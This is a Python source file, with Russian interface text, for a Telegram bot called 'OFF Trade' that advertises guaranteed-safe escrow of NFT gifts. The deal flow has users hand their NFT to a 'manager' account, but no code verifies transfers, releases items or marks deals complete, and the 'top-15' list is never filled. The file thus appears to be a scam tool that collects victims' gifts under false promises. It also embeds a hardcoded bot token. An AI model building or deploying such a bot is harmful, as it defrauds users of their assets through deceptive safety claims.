# NFT Exchange Bot для iPhone
# Полностью рабочий код с админ-панелью и баннерами

import requests
import time
import uuid
from datetime import datetime

# ===== НАСТРОЙКИ =====
TOKEN = "8487741416:AAHlISX26SKheAnTQJCv1rPHY-X0f3fWdI0"
ADMIN_ID = 174415647
SUPPORT = "GiftExchangersSupport"
MANAGER = "GiftExchangersManager"
BOT_USERNAME = "GiftExchangersBot"

# ===== ХРАНИЛИЩЕ ДАННЫХ =====
deals = {}  # сделки
top_deals = []  # топ-15
users = {}  # пользователи
banned_users = set()  # забаненные
settings = {
    "banner_text": "👋 Приветствуем в проекте «OFF Trade».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:",
    "max_amount": 400,
    "min_amount": 1
}

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 СОЗДАТЬ СДЕЛКУ"}],
            [{"text": "❓ КАК ПРОХОДИТ СДЕЛКА"}, {"text": "ℹ️ ИНФОРМАЦИЯ"}],
            [{"text": "📞 ТЕХПОДДЕРЖКА"}, {"text": "🏆 ТОП-15 ОБМЕНОВ"}]
        ],
        "resize_keyboard": True
    }

def admin_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📊 СТАТИСТИКА", "callback_data": "admin_stats"}],
            [{"text": "📢 РАССЫЛКА", "callback_data": "admin_broadcast"}],
            [{"text": "🚫 ЗАБАНИТЬ", "callback_data": "admin_ban"}],
            [{"text": "✅ РАЗБАНИТЬ", "callback_data": "admin_unban"}],
            [{"text": "📝 ИЗМЕНИТЬ БАННЕР", "callback_data": "admin_banner"}],
            [{"text": "💰 ИЗМЕНИТЬ ЛИМИТЫ", "callback_data": "admin_limits"}],
            [{"text": "📋 ВСЕ СДЕЛКИ", "callback_data": "admin_deals"}],
            [{"text": "❌ ЗАКРЫТЬ", "callback_data": "admin_close"}]
        ]
    }

# ===== ОТПРАВКА СООБЩЕНИЙ =====
def send_message(chat_id, text, keyboard=None, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    
    try:
        requests.post(url, json=data)
    except:
        pass

def send_inline_keyboard(chat_id, text, buttons, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    keyboard = {"inline_keyboard": buttons}
    data = {
        "chat_id": chat_id,
        "text": text,
        "reply_markup": keyboard,
        "parse_mode": parse_mode
    }
    try:
        requests.post(url, json=data)
    except:
        pass

def edit_message(chat_id, message_id, text, keyboard=None, parse_mode="HTML"):
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if keyboard:
        data["reply_markup"] = keyboard
    try:
        requests.post(url, json=data)
    except:
        pass

def answer_callback(callback_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    data = {
        "callback_query_id": callback_id,
        "text": text,
        "show_alert": False
    }
    requests.post(url, json=data)

# ===== ОБРАБОТКА КОМАНД =====
def handle_message(message):
    chat_id = message['chat']['id']
    text = message.get('text', '')
    user_id = message['from']['id']
    username = message['from'].get('username', 'NoUsername')
    first_name = message['from'].get('first_name', 'Пользователь')
    
    # Проверка на бан
    if user_id in banned_users:
        send_message(chat_id, "🚫 Вы забанены в боте!")
        return
    
    # Запоминаем пользователя
    if user_id not in users:
        users[user_id] = {
            'username': username,
            'first_name': first_name,
            'chat_id': chat_id,
            'state': None,
            'temp_data': {}
        }
    
    # ===== /start =====
    if text == '/start':
        welcome_text = f"""
<b>👋 Приветствуем в проекте «OFF Trade».</b>

<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>

👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
        """
        send_message(chat_id, welcome_text, main_keyboard())
    
    # ===== ИНФОРМАЦИЯ =====
    elif text == "ℹ️ ИНФОРМАЦИЯ":
        info_text = """
<b>📤 О ПРОЕКТЕ</b>

<b>Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram.</b>

<b>➕ ПЛЮСЫ ПРОЕКТА:</b>
• <b>Быстрые, качественные и безопасные обмены!</b>
• <b>Техническая поддержка 24/7</b>
• <b>Гарантия безопасности каждой сделки</b>
• <b>Конфиденциальность данных</b>
• <b>Интуитивно понятный интерфейс</b>

<b>📞 Техническая поддержка:</b> @GiftExchangersManager

<b>🤝 Желаем отличных обменов!</b>
        """
        buttons = [[
            {"text": "❓ КАК ПРОХОДИТ СДЕЛКА?", "callback_data": "how_deal"},
            {"text": "🏠 ГЛАВНОЕ МЕНЮ", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, info_text, buttons)
    
    # ===== КАК ПРОХОДИТ СДЕЛКА =====
    elif text == "❓ КАК ПРОХОДИТ СДЕЛКА":
        deal_text = """
<b>❓ КАК ПРОХОДИТ СДЕЛКА В OFF TRADE?</b>

<b>• Продавец и покупатель обговаривают условия сделки 🤝</b>

<b>• Один участник сделки создаёт сделку через чек/в меню бота - @GiftExchangersBot 🎁</b>

<b>• Второй участник сделки принимает сделку 📤</b>

<b>• После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰</b>

<b>• После передачи подарка, техподдержка моментально одобрит приход NFT на аккаунт</b>

<b>• Затем следующая сторона передаёт NFT человеку</b>

<b>• Менеджер автоматически передаст вам NFT</b>

<b>• После этого первая сторона сделки пишет любое сообщение технической поддержке - @GiftExchangersSupport, после чего моментально получает подарок</b>

<b>• Сделка завершена успешно! ✅</b>
        """
        buttons = [[
            {"text": "🏠 ГЛАВНОЕ МЕНЮ", "callback_data": "main_menu"}
        ]]
        send_inline_keyboard(chat_id, deal_text, buttons)
    
    # ===== ТЕХПОДДЕРЖКА =====
    elif text == "📞 ТЕХПОДДЕРЖКА":
        support_text = f"""
<b>📞 СВЯЗАТЬСЯ С ТЕХНИЧЕСКОЙ ПОДДЕРЖКОЙ:</b>

<b>👤 Менеджер:</b> @{MANAGER}
<b>👤 Поддержка:</b> @{SUPPORT}

<b>Напишите им в личные сообщения для получения помощи!</b>
        """
        send_message(chat_id, support_text, main_keyboard())
    
    # ===== ТОП-15 =====
    elif text == "🏆 ТОП-15 ОБМЕНОВ":
        if not top_deals:
            send_message(chat_id, "<b>🏆 ТОП-15 ОБМЕНОВ ПОКА ПУСТ. БУДЬТЕ ПЕРВЫМИ!</b>")
        else:
            top_text = "<b>🏆 ТОП-15 ЛУЧШИХ ОБМЕНОВ (до $400)</b>\n\n"
            for i, deal in enumerate(sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15], 1):
                top_text += f"<b>{i}. {deal['nft']} — ${deal['amount']}</b>\n"
            send_message(chat_id, top_text)
    
    # ===== СОЗДАТЬ СДЕЛКУ =====
    elif text == "📝 СОЗДАТЬ СДЕЛКУ":
        users[user_id]['state'] = 'waiting_nft'
        users[user_id]['temp_data'] = {}
        send_message(chat_id, "<b>Введите название NFT, которую хотите обменять:</b>")
    
    # ===== Обработка состояний =====
    elif user_id in users and users[user_id].get('state') == 'waiting_nft':
        users[user_id]['temp_data']['nft'] = text
        users[user_id]['state'] = 'waiting_amount'
        send_message(chat_id, f"<b>Введите сумму сделки в USD (до ${settings['max_amount']}):</b>")
    
    elif user_id in users and users[user_id].get('state') == 'waiting_amount':
        try:
            amount = float(text.replace('$', '').replace(',', '').strip())
            min_amount = settings['min_amount']
            max_amount = settings['max_amount']
            
            if amount < min_amount:
                send_message(chat_id, f"<b>❌ Минимальная сумма: ${min_amount}! Введите другую сумму:</b>")
                return
            
            if amount > max_amount:
                send_message(chat_id, f"<b>❌ Максимальная сумма: ${max_amount}! Введите другую сумму:</b>")
                return
            
            # Создаем сделку
            deal_id = str(uuid.uuid4())[:8]
            nft_name = users[user_id]['temp_data']['nft']
            
            deals[deal_id] = {
                'creator_id': user_id,
                'creator_name': username,
                'creator_first': first_name,
                'nft': nft_name,
                'amount': amount,
                'status': 'waiting',
                'created_at': datetime.now().strftime("%Y-%m-%d %H:%M"),
                'participant_id': None,
                'participant_name': None
            }
            
            deal_text = f"""
<b>✅ СДЕЛКА СОЗДАНА!</b>

<b>🆔 Номер сделки:</b> <code>{deal_id}</code>
<b>👤 Создатель:</b> @{username}
<b>🎁 NFT:</b> {nft_name}
<b>💰 Сумма:</b> ${amount}

<b>📤 Отправьте этот номер второму участнику для присоединения к сделке.</b>
            """
            
            buttons = [[
                {"text": "✅ ПРИНЯТЬ СДЕЛКУ", "callback_data": f"accept_{deal_id}"},
                {"text": "❌ ОТМЕНИТЬ", "callback_data": f"cancel_{deal_id}"}
            ]]
            
            send_inline_keyboard(chat_id, deal_text, buttons)
            users[user_id]['state'] = None
            users[user_id]['temp_data'] = {}
            
        except ValueError:
            send_message(chat_id, "<b>❌ Пожалуйста, введите число (например: 150)</b>")
    
    # ===== Админ-панель =====
    elif text == '/admin' and user_id == ADMIN_ID:
        admin_text = f"""
<b>👨‍💼 ПАНЕЛЬ АДМИНИСТРАТОРА</b>

<b>📊 Всего сделок:</b> {len(deals)}
<b>👥 Пользователей:</b> {len(users)}
<b>🚫 Забанено:</b> {len(banned_users)}
<b>💰 Макс. сумма:</b> ${settings['max_amount']}
        """
        send_inline_keyboard(chat_id, admin_text, admin_keyboard()['inline_keyboard'])
    
    # ===== Админ: рассылка (состояние) =====
    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_broadcast':
        broadcast_text = text
        users[user_id]['state'] = None
        
        sent = 0
        failed = 0
        
        send_message(chat_id, f"<b>📢 Начинаю рассылку {len(users)} пользователям...</b>")
        
        for uid, user_data in users.items():
            if uid != ADMIN_ID:
                try:
                    send_message(user_data['chat_id'], f"<b>📢 РАССЫЛКА ОТ АДМИНИСТРАЦИИ:</b>\n\n{broadcast_text}")
                    sent += 1
                    time.sleep(0.05)
                except:
                    failed += 1
        
        send_message(chat_id, f"<b>✅ Рассылка завершена!\n📨 Отправлено: {sent}\n❌ Не доставлено: {failed}</b>")
    
    # ===== Админ: баннер (состояние) =====
    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_banner':
        settings['banner_text'] = text
        users[user_id]['state'] = None
        send_message(chat_id, "<b>✅ Баннер успешно обновлен!</b>")
    
    # ===== Админ: лимиты (состояние) =====
    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_limits':
        try:
            min_val, max_val = text.replace('$', '').replace(' ', '').split('-')
            settings['min_amount'] = int(min_val)
            settings['max_amount'] = int(max_val)
            users[user_id]['state'] = None
            send_message(chat_id, f"<b>✅ Лимиты обновлены: ${min_val} - ${max_val}</b>")
        except:
            send_message(chat_id, "<b>❌ Неверный формат! Используйте: мин-макс (например: 1-400)</b>")
    
    # ===== Админ: бан (состояние) =====
    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_ban':
        try:
            target_id = int(text)
            banned_users.add(target_id)
            users[user_id]['state'] = None
            send_message(chat_id, f"<b>✅ Пользователь {target_id} забанен</b>")
        except:
            send_message(chat_id, "<b>❌ Введите ID пользователя</b>")
    
    # ===== Админ: разбан (состояние) =====
    elif user_id == ADMIN_ID and users[user_id].get('state') == 'admin_unban':
        try:
            target_id = int(text)
            if target_id in banned_users:
                banned_users.remove(target_id)
            users[user_id]['state'] = None
            send_message(chat_id, f"<b>✅ Пользователь {target_id} разбанен</b>")
        except:
            send_message(chat_id, "<b>❌ Введите ID пользователя</b>")

# ===== ОБРАБОТКА КНОПОК =====
def handle_callback(callback):
    chat_id = callback['message']['chat']['id']
    message_id = callback['message']['message_id']
    data = callback['data']
    user_id = callback['from']['id']
    callback_id = callback['id']
    
    # ===== ПРИНЯТЬ СДЕЛКУ =====
    if data.startswith('accept_'):
        deal_id = data.replace('accept_', '')
        
        if deal_id not in deals:
            edit_message(chat_id, message_id, "<b>❌ Сделка не найдена!</b>")
            answer_callback(callback_id, "Сделка не найдена")
            return
        
        deal = deals[deal_id]
        
        if deal['status'] != 'waiting':
            edit_message(chat_id, message_id, "<b>❌ Сделка уже недоступна!</b>")
            answer_callback(callback_id, "Сделка недоступна")
            return
        
        if user_id == deal['creator_id']:
            edit_message(chat_id, message_id, "<b>❌ Нельзя принять свою сделку!</b>")
            answer_callback(callback_id, "Это ваша сделка")
            return
        
        deal['participant_id'] = user_id
        deal['participant_name'] = callback['from'].get('username', 'NoUsername')
        deal['status'] = 'in_progress'
        
        # Уведомление создателю
        send_message(
            deal['creator_id'],
            f"<b>✅ @{callback['from'].get('username')} ПРИНЯЛ ВАШУ СДЕЛКУ!</b>\n\n<b>Теперь передайте NFT менеджеру @{MANAGER}</b>"
        )
        
        edit_message(chat_id, message_id, f"<b>✅ ВЫ ПРИНЯЛИ СДЕЛКУ #{deal_id}</b>\n\n<b>Ожидайте, когда создатель передаст NFT менеджеру.</b>")
        answer_callback(callback_id, "Сделка принята!")
    
    # ===== ОТМЕНИТЬ СДЕЛКУ =====
    elif data.startswith('cancel_'):
        deal_id = data.replace('cancel_', '')
        
        if deal_id in deals and deals[deal_id]['creator_id'] == user_id:
            deals[deal_id]['status'] = 'cancelled'
            edit_message(chat_id, message_id, f"<b>❌ СДЕЛКА #{deal_id} ОТМЕНЕНА</b>")
            answer_callback(callback_id, "Сделка отменена")
    
    # ===== ГЛАВНОЕ МЕНЮ =====
    elif data == "main_menu":
        welcome_text = f"""
<b>👋 Приветствуем в проекте «OFF Trade».</b>

<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>

👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
        """
        send_message(chat_id, welcome_text, main_keyboard())
        answer_callback(callback_id, "Главное меню")
    
    # ===== КАК СДЕЛКА =====
    elif data == "how_deal":
        deal_text = """
<b>❓ КАК ПРОХОДИТ СДЕЛКА В OFF TRADE?</b>

<b>• Продавец и покупатель обговаривают условия сделки 🤝</b>

<b>• Один участник сделки создаёт сделку через чек/в меню бота - @GiftExchangersBot 🎁</b>

<b>• Второй участник сделки принимает сделку 📤</b>

<b>• После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰</b>

<b>• После передачи подарка, техподдержка моментально одобрит приход NFT на аккаунт</b>

<b>• Затем следующая сторона передаёт NFT человеку</b>

<b>• Менеджер автоматически передаст вам NFT</b>

<b>• После этого первая сторона сделки пишет любое сообщение технической поддержке - @GiftExchangersSupport, после чего моментально получает подарок</b>

<b>• Сделка завершена успешно! ✅</b>
        """
        send_message(chat_id, deal_text)
        answer_callback(callback_id, "Информация о сделке")
    
    # ===== АДМИН: СТАТИСТИКА =====
    elif data == "admin_stats" and user_id == ADMIN_ID:
        total_deals = len(deals)
        active_deals = len([d for d in deals.values() if d['status'] == 'in_progress'])
        completed_deals = len([d for d in deals.values() if d['status'] == 'completed'])
        waiting_deals = len([d for d in deals.values() if d['status'] == 'waiting'])
        
        stats_text = f"""
<b>📊 СТАТИСТИКА</b>

<b>📌 Всего сделок:</b> {total_deals}
<b>✅ Завершено:</b> {completed_deals}
<b>🔄 Активных:</b> {active_deals}
<b>⏳ Ожидают:</b> {waiting_deals}
<b>👥 Пользователей:</b> {len(users)}
<b>🚫 Забанено:</b> {len(banned_users)}
<b>🏆 В топ-15:</b> {len(top_deals)}

<b>💰 ТОП-3 ОБМЕНА:</b>
        """
        
        for i, deal in enumerate(sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:3], 1):
            stats_text += f"\n<b>{i}. {deal['nft']} — ${deal['amount']}</b>"
        
        edit_message(chat_id, message_id, stats_text, admin_keyboard())
        answer_callback(callback_id, "Статистика")
    
    # ===== АДМИН: РАССЫЛКА =====
    elif data == "admin_broadcast" and user_id == ADMIN_ID:
        users[user_id]['state'] = 'admin_broadcast'
        edit_message(chat_id, message_id, "<b>📢 Введите текст для рассылки всем пользователям:</b>")
        answer_callback(callback_id, "Режим рассылки")
    
    # ===== АДМИН: ЗАБАНИТЬ =====
    elif data == "admin_ban" and user_id == ADMIN_ID:
        users[user_id]['state'] = 'admin_ban'
        edit_message(chat_id, message_id, "<b>🚫 Введите ID пользователя для бана:</b>")
        answer_callback(callback_id, "Режим бана")
    
    # ===== АДМИН: РАЗБАНИТЬ =====
    elif data == "admin_unban" and user_id == ADMIN_ID:
        users[user_id]['state'] = 'admin_unban'
        edit_message(chat_id, message_id, "<b>✅ Введите ID пользователя для разбана:</b>")
        answer_callback(callback_id, "Режим разбана")
    
    # ===== АДМИН: ИЗМЕНИТЬ БАННЕР =====
    elif data == "admin_banner" and user_id == ADMIN_ID:
        users[user_id]['state'] = 'admin_banner'
        edit_message(chat_id, message_id, "<b>📝 Введите новый текст баннера:</b>")
        answer_callback(callback_id, "Режим изменения баннера")
    
    # ===== АДМИН: ИЗМЕНИТЬ ЛИМИТЫ =====
    elif data == "admin_limits" and user_id == ADMIN_ID:
        users[user_id]['state'] = 'admin_limits'
        edit_message(chat_id, message_id, f"<b>💰 Введите лимиты в формате: мин-макс\nТекущие: ${settings['min_amount']}-${settings['max_amount']}</b>")
        answer_callback(callback_id, "Режим изменения лимитов")
    
    # ===== АДМИН: ВСЕ СДЕЛКИ =====
    elif data == "admin_deals" and user_id == ADMIN_ID:
        if not deals:
            edit_message(chat_id, message_id, "<b>📭 НЕТ АКТИВНЫХ СДЕЛОК</b>", admin_keyboard())
            answer_callback(callback_id, "Нет сделок")
            return
        
        deals_text = "<b>📋 ВСЕ СДЕЛКИ:</b>\n\n"
        for deal_id, deal in list(deals.items())[:10]:  # Показываем только первые 10
            status_emoji = "⏳" if deal['status'] == 'waiting' else "🔄" if deal['status'] == 'in_progress' else "✅" if deal['status'] == 'completed' else "❌"
            deals_text += f"{status_emoji} <b>{deal_id}</b>\n"
            deals_text += f"👤 <b>Создатель:</b> @{deal['creator_name']}\n"
            deals_text += f"🎁 <b>NFT:</b> {deal['nft']}\n"
            deals_text += f"💰 <b>${deal['amount']}</b>\n"
            deals_text += f"📊 <b>Статус:</b> {deal['status']}\n"
            deals_text += "—" * 20 + "\n"
        
        if len(deals) > 10:
            deals_text += f"\n<b>...и еще {len(deals) - 10} сделок</b>"
        
        edit_message(chat_id, message_id, deals_text, admin_keyboard())
        answer_callback(callback_id, "Список сделок")
    
    # ===== АДМИН: ЗАКРЫТЬ =====
    elif data == "admin_close" and user_id == ADMIN_ID:
        welcome_text = f"""
<b>👋 Приветствуем в проекте «OFF Trade».</b>

<b>🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.</b>

👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:
        """
        send_message(chat_id, welcome_text, main_keyboard())
        answer_callback(callback_id, "Панель закрыта")

# ===== ЗАПУСК =====
def main():
    print("🚀 NFT Exchange Bot запущен на iPhone!")
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print("✅ Нажми Ctrl+C для остановки")
    
    offset = 0
    while True:
        try:
            # Получаем обновления
            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
            response = requests.get(url, params={
                "offset": offset,
                "timeout": 30
            })
            
            if response.status_code == 200:
                updates = response.json().get('result', [])
                
                for update in updates:
                    offset = update['update_id'] + 1
                    
                    if 'message' in update:
                        handle_message(update['message'])
                    elif 'callback_query' in update:
                        handle_callback(update['callback_query'])
                        
            time.sleep(0.5)
            
        except KeyboardInterrupt:
            print("\n❌ Бот остановлен")
            break
        except Exception as e:
            print(f"Ошибка: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
